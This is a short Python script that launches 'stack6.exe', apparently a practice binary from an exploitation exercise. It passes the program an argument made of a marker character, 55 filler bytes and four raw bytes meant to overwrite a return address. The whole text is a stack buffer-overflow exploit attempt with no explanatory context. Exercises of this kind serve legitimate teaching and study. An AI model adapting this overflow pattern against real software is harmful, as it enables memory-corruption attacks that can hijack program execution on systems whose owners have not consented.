import subprocess

args = 'stack6.exe ' + '\x40' + 55 * 'x' + '\x58\x0A\x0D\x35'
subprocess.call(args)